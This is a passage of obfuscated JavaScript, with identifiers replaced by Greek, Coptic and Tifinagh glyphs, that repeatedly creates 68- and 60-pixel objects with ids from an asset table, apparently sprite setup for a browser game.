			this.ⵠⵠΔ[ᐃᐃ.ΔᐃⲆᐃⵠ] = Δⵠⵠ(68, 68, "", ⵠⲆ[Ⲇ.ⲆΔᐃⵠⲆΔⲆ], 3);
			this.ⵠⵠΔ[ᐃᐃ.ΔᐃⲆᐃⵠ].id = ᐃᐃ.ΔᐃⲆᐃⵠ;
			this.ⵠⵠΔ[ᐃᐃ.ⵠⲆΔⲆΔ] = Δⵠⵠ(68, 68, "", ⵠⲆ[Ⲇ.ᐃΔΔᐃΔΔΔ], 3);
			this.ⵠⵠΔ[ᐃᐃ.ⵠⲆΔⲆΔ].id = ᐃᐃ.ⵠⲆΔⲆΔ;
			this.ⵠⵠΔ[ᐃᐃ.ᐃΔⵠⵠⲆ] = Δⵠⵠ(68, 68, "", ⵠⲆ[Ⲇ.ΔⲆⵠΔᐃⵠⵠ], ⵠⵠⵠⵠ);
			this.ⵠⵠΔ[ᐃᐃ.ᐃΔⵠⵠⲆ].id = ᐃᐃ.ᐃΔⵠⵠⲆ;
			this.ⵠⵠΔ[ᐃᐃ.ΔΔΔᐃⲆ] = Δⵠⵠ(68, 68, "", ⵠⲆ[Ⲇ.ⵠⲆⲆΔⲆᐃᐃ], ⵠⵠⵠᐃ);
			this.ⵠⵠΔ[ᐃᐃ.ΔΔΔᐃⲆ].id = ᐃᐃ.ΔΔΔᐃⲆ;
			this.ⵠⵠΔ[ᐃᐃ.ΔᐃⲆⲆΔ] = Δⵠⵠ(68, 68, "", ⵠⲆ[Ⲇ.ᐃᐃΔᐃΔᐃⵠ], ᐃⲆΔⵠ);
			this.ⵠⵠΔ[ᐃᐃ.ΔᐃⲆⲆΔ].id = ᐃᐃ.ΔᐃⲆⲆΔ;
			this.ⵠⵠΔ[ᐃᐃ.ⵠⵠᐃⲆᐃ] = Δⵠⵠ(68, 68, "", ⵠⲆ[Ⲇ.ⲆⵠᐃΔⵠᐃⵠ], 3);
			this.ⵠⵠΔ[ᐃᐃ.ⵠⵠᐃⲆᐃ].id = ᐃᐃ.ⵠⵠᐃⲆᐃ;
			this.ⵠⵠΔ[ᐃᐃ.ΔⵠᐃⲆⲆ] = Δⵠⵠ(68, 68, "", ⵠⲆ[Ⲇ.ⵠᐃⵠᐃᐃⵠᐃ], ΔᐃⲆΔ);
			this.ⵠⵠΔ[ᐃᐃ.ΔⵠᐃⲆⲆ].id = ᐃᐃ.ΔⵠᐃⲆⲆ;
			this.ⵠⵠΔ[ᐃᐃ.ΔⲆΔⵠⵠ] = Δⵠⵠ(68, 68, "", ⵠⲆ[Ⲇ.ΔᐃᐃΔⲆᐃⲆ], ⲆᐃΔᐃ);
			this.ⵠⵠΔ[ᐃᐃ.ΔⲆΔⵠⵠ].id = ᐃᐃ.ΔⲆΔⵠⵠ;
			this.ⵠⵠΔ[ᐃᐃ.ⲆⲆⵠΔⲆ] = Δⵠⵠ(68, 68, "", ⵠⲆ[Ⲇ.ᐃΔⵠⵠΔⵠⲆ], ᐃⲆᐃᐃ);
			this.ⵠⵠΔ[ᐃᐃ.ⲆⲆⵠΔⲆ].id = ᐃᐃ.ⲆⲆⵠΔⲆ;
			this.ⵠⵠΔ[ᐃᐃ.ⲆⲆⵠᐃⵠ] = Δⵠⵠ(68, 68, "", ⵠⲆ[Ⲇ.ΔΔⲆⵠⲆᐃⵠ], 3);
			this.ⵠⵠΔ[ᐃᐃ.ⲆⲆⵠᐃⵠ].id = ᐃᐃ.ⲆⲆⵠᐃⵠ;
			this.ⵠⵠΔ[ᐃᐃ.ΔⵠⲆΔⵠ] = Δⵠⵠ(68, 68, "", ⵠⲆ[Ⲇ.ⵠⵠⵠⲆⲆᐃⵠ], 3);
			this.ⵠⵠΔ[ᐃᐃ.ΔⵠⲆΔⵠ].id = ᐃᐃ.ΔⵠⲆΔⵠ;
			this.ⵠⵠΔ[ᐃᐃ.ᐃᐃΔⲆΔ] = Δⵠⵠ(68, 68, "", ⵠⲆ[Ⲇ.ⲆΔΔⲆⵠΔΔ], ΔᐃⲆΔ);
			this.ⵠⵠΔ[ᐃᐃ.ᐃᐃΔⲆΔ].id = ᐃᐃ.ᐃᐃΔⲆΔ;
			this.ⵠⵠΔ[ᐃᐃ.ᐃΔΔΔⵠ] = Δⵠⵠ(68, 68, "", ⵠⲆ[Ⲇ.ⲆΔⲆᐃΔⵠⲆ], 3);
			this.ⵠⵠΔ[ᐃᐃ.ᐃΔΔΔⵠ].id = ᐃᐃ.ᐃΔΔΔⵠ;
			this.ⵠⵠΔ[ᐃᐃ.ⲆⲆⲆⲆΔ] = Δⵠⵠ(68, 68, "", ⵠⲆ[Ⲇ.ⵠⵠⵠᐃⵠⲆⵠ], ΔⲆΔᐃ);
			this.ⵠⵠΔ[ᐃᐃ.ⲆⲆⲆⲆΔ].id = ᐃᐃ.ⲆⲆⲆⲆΔ;
			this.ⵠⵠΔ[ᐃᐃ.ΔⲆⲆⲆⲆ] = Δⵠⵠ(68, 68, "", ⵠⲆ[Ⲇ.ΔΔᐃΔⲆⵠΔ], ⵠⵠⵠⵠ);
			this.ⵠⵠΔ[ᐃᐃ.ΔⲆⲆⲆⲆ].id = ᐃᐃ.ΔⲆⲆⲆⲆ;
			this.ⵠⵠΔ[ᐃᐃ.ᐃⲆⲆⲆᐃ] = Δⵠⵠ(68, 68, "", ⵠⲆ[Ⲇ.ᐃᐃⲆᐃΔᐃᐃ], 3);
			this.ⵠⵠΔ[ᐃᐃ.ᐃⲆⲆⲆᐃ].id = ᐃᐃ.ᐃⲆⲆⲆᐃ;
			this.ⵠⵠΔ[ᐃᐃ.ΔᐃⲆⵠⲆ] = Δⵠⵠ(68, 68, "", ⵠⲆ[Ⲇ.ΔⲆⲆᐃΔⵠⲆ], 3);
			this.ⵠⵠΔ[ᐃᐃ.ΔᐃⲆⵠⲆ].id = ᐃᐃ.ΔᐃⲆⵠⲆ;
			this.ⵠⵠΔ[ᐃᐃ.ⵠⲆⵠᐃⲆ] = Δⵠⵠ(68, 68, "", ⵠⲆ[Ⲇ.ΔᐃΔⵠΔⲆⵠ], 3);
			this.ⵠⵠΔ[ᐃᐃ.ⵠⲆⵠᐃⲆ].id = ᐃᐃ.ⵠⲆⵠᐃⲆ;
			this.ΔΔᐃⵠⲆ = [];
			for (var ⵠᐃ = ⵠΔⲆⵠ; 250 > ⵠᐃ; ⵠᐃ++) this.ΔΔᐃⵠⲆ[ⵠᐃ] = Δⵠⵠ(0, 0, "", ⵠⲆ[Ⲇ.ⵠⲆⲆΔΔⵠᐃ]);
			this.ᐃⵠᐃ = [];
			this.ᐃⵠᐃ[ᐃᐃ.ⲆᐃⵠΔᐃ] = Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ⵠⵠΔᐃᐃᐃⵠ], 3);
			this.ᐃⵠᐃ[ᐃᐃ.ⲆᐃⵠΔᐃ].id = ᐃᐃ.ⲆᐃⵠΔᐃ;
			this.ᐃⵠᐃ[ᐃᐃ.ⲆⵠᐃⵠΔ] = Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ⵠᐃⵠΔΔⲆΔ], ΔᐃⲆΔ);
			this.ᐃⵠᐃ[ᐃᐃ.ⲆⵠᐃⵠΔ].id = ᐃᐃ.ⲆⵠᐃⵠΔ;
			this.ᐃⵠᐃ[ᐃᐃ.ᐃᐃΔⲆ] = Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ΔΔᐃⲆΔΔᐃ], 3);
			this.ᐃⵠᐃ[ᐃᐃ.ᐃᐃΔⲆ].id = ᐃᐃ.ᐃᐃΔⲆ;
			this.ᐃⵠᐃ[ᐃᐃ.ᐃᐃΔⲆ].info.ᐃⵠ[ΔⵠᐃⲆ] = this.ᐃⵠᐃ[ᐃᐃ.ᐃᐃΔⲆ].info.ᐃⵠ[ΔᐃΔΔ];
			this.ᐃⵠᐃ[ᐃᐃ.ⵠⲆⲆᐃ] = Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ⵠⵠⲆⲆⲆⵠⲆ], 3);
			this.ᐃⵠᐃ[ᐃᐃ.ⵠⲆⲆᐃ].id = ᐃᐃ.ⵠⲆⲆᐃ;
			this.ᐃⵠᐃ[ᐃᐃ.ⵠⲆⲆᐃ].info.ᐃⵠ[2] = this.ᐃⵠᐃ[ᐃᐃ.ⵠⲆⲆᐃ].info.ᐃⵠ[ⵠᐃⲆᐃ];
			this.ᐃⵠᐃ[ᐃᐃ.ⵠⲆΔⲆⲆ] = Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ΔⲆⵠᐃΔⵠⵠ], 3);
			this.ᐃⵠᐃ[ᐃᐃ.ⵠⲆΔⲆⲆ].id = ᐃᐃ.ⵠⲆΔⲆⲆ;
			this.ᐃⵠᐃ[ᐃᐃ.ⵠᐃΔᐃΔ] = Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ⵠΔᐃⵠΔΔⵠ], ⲆᐃΔᐃ);
			this.ᐃⵠᐃ[ᐃᐃ.ⵠᐃΔᐃΔ].id = ᐃᐃ.ⵠᐃΔᐃΔ;
			this.ᐃⵠᐃ[ᐃᐃ.ΔⲆⵠⵠ] = Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ⵠΔΔᐃΔᐃΔ], ᐃⵠⲆΔᐃ);
			this.ᐃⵠᐃ[ᐃᐃ.ΔⲆⵠⵠ].id = ᐃᐃ.ΔⲆⵠⵠ;
			this.ᐃⵠᐃ[ᐃᐃ.ΔⲆⵠⵠ].info.ᐃⵠ[ΔⵠⵠΔ] = this.ᐃⵠᐃ[ᐃᐃ.ΔⲆⵠⵠ].info.ᐃⵠ[Δᐃᐃᐃ];
			this.ᐃⵠᐃ[ᐃᐃ.ΔⲆᐃΔ] = Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ᐃⵠⵠᐃⵠᐃⵠ], 3);
			this.ᐃⵠᐃ[ᐃᐃ.ΔⲆᐃΔ].id = ᐃᐃ.ΔⲆᐃΔ;
			this.ᐃⵠᐃ[ᐃᐃ.ΔⲆᐃΔ].info.ᐃⵠ[Ⲇᐃᐃⵠ] = this.ᐃⵠᐃ[ᐃᐃ.ΔⲆᐃΔ].info.ᐃⵠ[0];
			this.ᐃⵠᐃ[ᐃᐃ.ΔΔⲆⵠⲆ] = Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ⲆᐃⵠⵠⲆΔΔ], ΔⲆΔᐃ);
			this.ᐃⵠᐃ[ᐃᐃ.ΔΔⲆⵠⲆ].id = ᐃᐃ.ΔΔⲆⵠⲆ;
			this.ᐃⵠᐃ[ᐃᐃ.ⵠⲆⲆΔⲆ] = Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ⲆΔΔᐃⵠⲆⲆ], 3);
			this.ᐃⵠᐃ[ᐃᐃ.ⵠⲆⲆΔⲆ].id = ᐃᐃ.ⵠⲆⲆΔⲆ;
			this.ᐃⵠᐃ[ᐃᐃ.ⵠᐃⲆⵠΔ] = Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ΔⲆᐃⵠⵠΔᐃ], ⵠΔΔΔΔ);
			this.ᐃⵠᐃ[ᐃᐃ.ⵠᐃⲆⵠΔ].id = ᐃᐃ.ⵠᐃⲆⵠΔ;
			this.ᐃⵠᐃ[ᐃᐃ.ΔΔⵠᐃᐃ] = Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ᐃⲆⵠⲆⵠⲆΔ], 3);
			this.ᐃⵠᐃ[ᐃᐃ.ΔΔⵠᐃᐃ].id = ᐃᐃ.ΔΔⵠᐃᐃ;
			this.ᐃⵠᐃ[ᐃᐃ.ᐃΔⵠᐃⵠ] = Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ΔΔⲆⵠⵠΔᐃ], 3);
			this.ᐃⵠᐃ[ᐃᐃ.ᐃΔⵠᐃⵠ].id = ᐃᐃ.ᐃΔⵠᐃⵠ;
			this.ᐃⵠᐃ[ᐃᐃ.ⵠⲆΔᐃΔ] = Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ⵠⵠΔᐃΔⲆⲆ], 3);
			this.ᐃⵠᐃ[ᐃᐃ.ⵠⲆΔᐃΔ].id = ᐃᐃ.ⵠⲆΔᐃΔ;
			this.ᐃⵠᐃ[ᐃᐃ.ᐃⲆⲆΔᐃ] = Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ΔⲆⵠⵠᐃⲆᐃ], ᐃᐃⲆⲆ);
			this.ᐃⵠᐃ[ᐃᐃ.ᐃⲆⲆΔᐃ].id = ᐃᐃ.ᐃⲆⲆΔᐃ;
			this.ᐃⵠᐃ[ᐃᐃ.ⵠΔⵠᐃΔ] = Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ᐃΔⵠᐃⵠᐃᐃ], 3);
			this.ᐃⵠᐃ[ᐃᐃ.ⵠΔⵠᐃΔ].id = ᐃᐃ.ⵠΔⵠᐃΔ;
			this.ᐃⵠᐃ[ᐃᐃ.ⲆΔΔⵠᐃ] = Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ᐃΔⲆΔᐃᐃᐃ], 3);
			this.ᐃⵠᐃ[ᐃᐃ.ⲆΔΔⵠᐃ].id = ᐃᐃ.ⲆΔΔⵠᐃ;
			this.ᐃⵠᐃ[ᐃᐃ.ⵠⵠⵠΔⲆ] = Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ⲆⲆΔΔⲆᐃΔ], ⵠΔΔΔΔ);
			this.ᐃⵠᐃ[ᐃᐃ.ⵠⵠⵠΔⲆ].id = ᐃᐃ.ⵠⵠⵠΔⲆ;
			this.ᐃⵠᐃ[ᐃᐃ.ΔᐃⲆΔⲆ] = Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ᐃⵠⵠΔⲆΔⲆ], 3);
			this.ᐃⵠᐃ[ᐃᐃ.ΔᐃⲆΔⲆ].id = ᐃᐃ.ΔᐃⲆΔⲆ;
			this.ᐃⵠᐃ[ᐃᐃ.ⲆᐃⲆⲆⲆ] = Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ᐃⲆΔⵠΔᐃⵠ], ⵠⵠⵠᐃ);
			this.ᐃⵠᐃ[ᐃᐃ.ⲆᐃⲆⲆⲆ].id = ᐃᐃ.ⲆᐃⲆⲆⲆ;
			this.ᐃⵠᐃ[ᐃᐃ.ⵠⲆᐃⲆⵠ] = Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ΔⲆΔΔⵠⵠᐃ], ᐃᐃⲆⲆ);
			this.ᐃⵠᐃ[ᐃᐃ.ⵠⲆᐃⲆⵠ].id = ᐃᐃ.ⵠⲆᐃⲆⵠ;
			this.ᐃⵠᐃ[ᐃᐃ.ⲆⵠⵠⵠⲆ] = Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ᐃⵠᐃᐃⲆᐃⵠ], 3);
			this.ᐃⵠᐃ[ᐃᐃ.ⲆⵠⵠⵠⲆ].id = ᐃᐃ.ⲆⵠⵠⵠⲆ;
			this.ᐃⵠᐃ[ᐃᐃ.ΔΔⵠⵠᐃ] = Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ⲆⵠΔᐃⲆᐃΔ], Δⵠᐃⵠ);
			this.ᐃⵠᐃ[ᐃᐃ.ΔΔⵠⵠᐃ].id = ᐃᐃ.ΔΔⵠⵠᐃ;
			this.ᐃⵠᐃ[ᐃᐃ.ᐃᐃᐃΔΔ] = Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ⲆΔΔᐃᐃⲆᐃ], ΔᐃⲆΔ);
			this.ᐃⵠᐃ[ᐃᐃ.ᐃᐃᐃΔΔ].id = ᐃᐃ.ᐃᐃᐃΔΔ;
			this.ᐃⵠᐃ[ᐃᐃ.ᐃᐃᐃΔΔ].info.ᐃⵠ[ΔⵠᐃⲆ] = this.ᐃⵠᐃ[ᐃᐃ.ᐃᐃᐃΔΔ].info.ᐃⵠ[ⵠΔⲆⵠ];
			this.ᐃⵠᐃ[ᐃᐃ.ΔⵠΔⲆⲆ] = Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ᐃⵠΔᐃΔⵠⲆ], ΔᐃⲆΔ);
			this.ᐃⵠᐃ[ᐃᐃ.ΔⵠΔⲆⲆ].id = ᐃᐃ.ΔⵠΔⲆⲆ;
			this.ᐃⵠᐃ[ᐃᐃ.ⲆᐃᐃΔⲆ] = Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ⵠⲆΔΔΔⵠⵠ], 3);
			this.ᐃⵠᐃ[ᐃᐃ.ⲆᐃᐃΔⲆ].id = ᐃᐃ.ⲆᐃᐃΔⲆ;
			this.ᐃⵠᐃ[ᐃᐃ.ⲆΔⲆᐃᐃ] = Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ΔⲆΔΔⵠⵠⵠ], 3);
			this.ᐃⵠᐃ[ᐃᐃ.ⲆΔⲆᐃᐃ].id = ᐃᐃ.ⲆΔⲆᐃᐃ;
			this.ᐃⵠᐃ[ᐃᐃ.ⵠᐃᐃⵠᐃ] = Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ⲆⵠⲆᐃⲆᐃΔ], ᐃⲆΔⵠ);
			this.ᐃⵠᐃ[ᐃᐃ.ⵠᐃᐃⵠᐃ].id = ᐃᐃ.ⵠᐃᐃⵠᐃ;
			this.ᐃⵠᐃ[ᐃᐃ.ⵠⵠⵠᐃⵠ] = Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ⲆᐃΔΔⲆⲆᐃ], ⲆᐃΔᐃ);
			this.ᐃⵠᐃ[ᐃᐃ.ⵠⵠⵠᐃⵠ].id = ᐃᐃ.ⵠⵠⵠᐃⵠ;
			this.ᐃⵠᐃ[ᐃᐃ.ⲆΔᐃΔᐃ] = Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ᐃⵠⲆᐃⵠⲆΔ], 3);
			this.ᐃⵠᐃ[ᐃᐃ.ⲆΔᐃΔᐃ].id = ᐃᐃ.ⲆΔᐃΔᐃ;
			this.ᐃⵠᐃ[ᐃᐃ.ⲆΔⲆⵠΔ] = Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ΔⲆⲆⲆⲆⵠΔ], ᐃᐃⵠⲆᐃ);
			this.ᐃⵠᐃ[ᐃᐃ.ⲆΔⲆⵠΔ].id = ᐃᐃ.ⲆΔⲆⵠΔ;
			this.ᐃⵠᐃ[ᐃᐃ.ⲆⲆΔⵠⲆ] = Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ᐃΔⲆⵠΔⵠⲆ], 3);
			this.ᐃⵠᐃ[ᐃᐃ.ⲆⲆΔⵠⲆ].id = ᐃᐃ.ⲆⲆΔⵠⲆ;
			this.ᐃⵠᐃ[ᐃᐃ.ⵠᐃᐃⵠ] = Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ⵠⵠⲆᐃⲆⲆⲆ], Δⵠᐃⵠ);
			this.ᐃⵠᐃ[ᐃᐃ.ⵠᐃᐃⵠ].id = ᐃᐃ.ⵠᐃᐃⵠ;
			this.ᐃⵠᐃ[ᐃᐃ.ΔⵠᐃⲆⵠ] = Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ⵠᐃᐃⵠᐃⵠⲆ], 3);
			this.ᐃⵠᐃ[ᐃᐃ.ΔⵠᐃⲆⵠ].id = ᐃᐃ.ΔⵠᐃⲆⵠ;
			this.ᐃⵠᐃ[ᐃᐃ.ⲆΔⵠΔΔ] = Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ⲆΔΔⵠᐃⲆⲆ], ΔᐃⲆΔ);
			this.ᐃⵠᐃ[ᐃᐃ.ⲆΔⵠΔΔ].id = ᐃᐃ.ⲆΔⵠΔΔ;
			this.ᐃⵠᐃ[ᐃᐃ.ⵠᐃⵠⵠᐃ] = Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ΔⵠⵠΔⵠⵠΔ], 3);
			this.ᐃⵠᐃ[ᐃᐃ.ⵠᐃⵠⵠᐃ].id = ᐃᐃ.ⵠᐃⵠⵠᐃ;
			this.ᐃⵠᐃ[ᐃᐃ.ⵠⵠⵠᐃⲆ] = Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ᐃⲆⲆΔⲆΔⲆ], 3);
			this.ᐃⵠᐃ[ᐃᐃ.ⵠⵠⵠᐃⲆ].id = ᐃᐃ.ⵠⵠⵠᐃⲆ;
			this.ᐃⵠᐃ[ᐃᐃ.ⲆᐃⵠⲆᐃ] = Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ΔⵠᐃⵠⲆⲆⵠ], ⵠᐃⵠⲆ);
			this.ᐃⵠᐃ[ᐃᐃ.ⲆᐃⵠⲆᐃ].id = ᐃᐃ.ⲆᐃⵠⲆᐃ;
			this.ᐃⵠᐃ[ᐃᐃ.ⲆᐃⵠⲆᐃ].info.ᐃⵠ[ⲆⵠΔΔ] = this.ᐃⵠᐃ[ᐃᐃ.ⲆᐃⵠⲆᐃ].info.ᐃⵠ[0];
			this.ᐃⵠᐃ[ᐃᐃ.ΔΔᐃΔᐃ] = Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ΔΔⲆⲆΔΔⵠ], ᐃⲆᐃᐃ);
			this.ᐃⵠᐃ[ᐃᐃ.ΔΔᐃΔᐃ].id = ᐃᐃ.ΔΔᐃΔᐃ;
			this.ᐃⵠᐃ[ᐃᐃ.ΔΔᐃΔᐃ].info.ᐃⵠ[ⲆⵠΔΔ] = this.ᐃⵠᐃ[ᐃᐃ.ΔΔᐃΔᐃ].info.ᐃⵠ[0];
			this.ᐃⵠᐃ[ᐃᐃ.ΔᐃᐃᐃΔ] = Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ⲆΔΔⵠⵠⲆⲆ], ⵠⵠⵠᐃ);
			this.ᐃⵠᐃ[ᐃᐃ.ΔᐃᐃᐃΔ].id = ᐃᐃ.ΔᐃᐃᐃΔ;
			this.ᐃⵠᐃ[ᐃᐃ.ΔᐃᐃᐃΔ].info.ᐃⵠ[ᐃⵠⲆⲆⲆ] = this.ᐃⵠᐃ[ᐃᐃ.ΔᐃᐃᐃΔ].info.ᐃⵠ[Δᐃᐃᐃ];
			this.ᐃⵠᐃ[ᐃᐃ.ΔⲆᐃⲆⲆ] = Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ᐃⲆⲆⵠΔ], 3);
			this.ᐃⵠᐃ[ᐃᐃ.ΔⲆᐃⲆⲆ].id = ᐃᐃ.ΔⲆᐃⲆⲆ;
			this.ᐃⵠᐃ[ᐃᐃ.ⵠᐃⲆᐃᐃ] = Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ᐃⵠⲆⵠⲆ], 3);
			this.ᐃⵠᐃ[ᐃᐃ.ⵠᐃⲆᐃᐃ].id = ᐃᐃ.ⵠᐃⲆᐃᐃ;
			this.ᐃⵠᐃ[ᐃᐃ.ᐃⲆΔᐃΔ] = Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ⲆᐃⲆⵠΔ], ⲆⲆΔⲆ);
			this.ᐃⵠᐃ[ᐃᐃ.ᐃⲆΔᐃΔ].id = ᐃᐃ.ᐃⲆΔᐃΔ;
			this.ᐃⵠᐃ[ᐃᐃ.ⵠⲆⲆᐃᐃ] = Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ⲆᐃᐃⵠΔ], 3);
			this.ᐃⵠᐃ[ᐃᐃ.ⵠⲆⲆᐃᐃ].id = ᐃᐃ.ⵠⲆⲆᐃᐃ;
			this.ᐃⵠᐃ[ᐃᐃ.ΔⵠᐃⲆⵠ] = Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ⵠᐃᐃⵠᐃⵠⲆ], ⵠᐃⵠⲆ);
			this.ᐃⵠᐃ[ᐃᐃ.ΔⵠᐃⲆⵠ].id = ᐃᐃ.ΔⵠᐃⲆⵠ;
			this.ᐃⵠᐃ[ᐃᐃ.ᐃᐃⲆⵠᐃ] = Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ᐃⵠᐃⵠᐃᐃⵠ], ΔΔⵠΔ);
			this.ᐃⵠᐃ[ᐃᐃ.ᐃᐃⲆⵠᐃ].id = ᐃᐃ.ᐃᐃⲆⵠᐃ;
			this.ᐃⵠᐃ[ᐃᐃ.ⲆⲆⵠΔⲆ] = Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ⵠΔᐃⵠΔᐃΔ], 3);
			this.ᐃⵠᐃ[ᐃᐃ.ⲆⲆⵠΔⲆ].id = ᐃᐃ.ⲆⲆⵠΔⲆ;
			this.ᐃⵠᐃ[ᐃᐃ.ΔⵠΔΔⲆ] = Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ΔⲆⲆⵠⵠⵠⵠ], 3);
			this.ᐃⵠᐃ[ᐃᐃ.ΔⵠΔΔⲆ].id = ᐃᐃ.ΔⵠΔΔⲆ;
			this.ᐃⵠᐃ[ᐃᐃ.ⵠⵠⲆΔⲆ] = Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ΔΔⲆⵠⵠΔⵠ], ΔⲆᐃⲆ);
			this.ᐃⵠᐃ[ᐃᐃ.ⵠⵠⲆΔⲆ].id = ᐃᐃ.ⵠⵠⲆΔⲆ;
			this.ᐃⵠᐃ[ᐃᐃ.ΔᐃΔΔΔ] = Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ᐃΔⵠⲆΔⵠᐃ], ΔᐃⲆΔ);
			this.ᐃⵠᐃ[ᐃᐃ.ΔᐃΔΔΔ].id = ᐃᐃ.ΔᐃΔΔΔ;
			this.ᐃⵠᐃ[ᐃᐃ.ⲆⲆⵠᐃⵠ] = Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ᐃⲆᐃⵠⲆⵠΔ], 3);
			this.ᐃⵠᐃ[ᐃᐃ.ⲆⲆⵠᐃⵠ].id = ᐃᐃ.ⲆⲆⵠᐃⵠ;
			this.ᐃⵠᐃ[ᐃᐃ.ⵠΔⵠΔᐃ] = Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ΔⵠΔⵠⵠᐃⲆ], 3);
			this.ᐃⵠᐃ[ᐃᐃ.ⵠΔⵠΔᐃ].id = ᐃᐃ.ⵠΔⵠΔᐃ;
			this.ᐃⵠᐃ[ᐃᐃ.ΔⵠⲆⵠΔ] = Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ⵠΔⵠΔΔⵠⲆ], 3);
			this.ᐃⵠᐃ[ᐃᐃ.ΔⵠⲆⵠΔ].id = ᐃᐃ.ΔⵠⲆⵠΔ;
			this.ᐃⵠᐃ[ᐃᐃ.ᐃⵠΔⲆᐃ] = Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ⵠᐃᐃⵠⵠᐃᐃ], ᐃⲆΔⵠ);
			this.ᐃⵠᐃ[ᐃᐃ.ᐃⵠΔⲆᐃ].id = ᐃᐃ.ᐃⵠΔⲆᐃ;
			this.ᐃⵠᐃ[ᐃᐃ.ⲆᐃⲆᐃⲆ] = Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ΔΔⲆΔΔⵠⲆ], ΔᐃⲆΔ);
			this.ᐃⵠᐃ[ᐃᐃ.ⲆᐃⲆᐃⲆ].id = ᐃᐃ.ⲆᐃⲆᐃⲆ;
			this.ᐃⵠᐃ[ᐃᐃ.ΔᐃⲆⵠΔ] = Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ᐃⵠΔΔᐃⲆᐃ], Δⵠᐃⵠ);
			this.ᐃⵠᐃ[ᐃᐃ.ΔᐃⲆⵠΔ].id = ᐃᐃ.ΔᐃⲆⵠΔ;
			this.ᐃⵠᐃ[ᐃᐃ.ⲆⲆΔᐃᐃ] = Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ᐃⲆΔⵠᐃΔⲆ], ΔΔᐃΔ);
			this.ᐃⵠᐃ[ᐃᐃ.ⲆⲆΔᐃᐃ].id = ᐃᐃ.ⲆⲆΔᐃᐃ;
			this.ᐃⵠᐃ[ᐃᐃ.ⲆⲆⵠᐃᐃ] = Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ΔᐃⵠᐃⲆⲆⲆ], 3);
			this.ᐃⵠᐃ[ᐃᐃ.ⲆⲆⵠᐃᐃ].id = ᐃᐃ.ⲆⲆⵠᐃᐃ;
			this.ᐃⵠᐃ[ᐃᐃ.ⵠᐃΔⲆⵠ] = Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ⲆⲆⵠΔᐃΔⵠ], Δⵠᐃⵠ);
			this.ᐃⵠᐃ[ᐃᐃ.ⵠᐃΔⲆⵠ].id = ᐃᐃ.ⵠᐃΔⲆⵠ;
			this.ᐃⵠᐃ[ᐃᐃ.ΔᐃΔΔᐃ] = Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ᐃΔΔΔⵠⵠⵠ], 3);
			this.ᐃⵠᐃ[ᐃᐃ.ΔᐃΔΔᐃ].id = ᐃᐃ.ΔᐃΔΔᐃ;
			this.ᐃⵠᐃ[ᐃᐃ.ⵠⲆⲆⲆΔ] = Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ⲆⲆᐃⲆⲆᐃᐃ], 3);
			this.ᐃⵠᐃ[ᐃᐃ.ⵠⲆⲆⲆΔ].id = ᐃᐃ.ⵠⲆⲆⲆΔ;
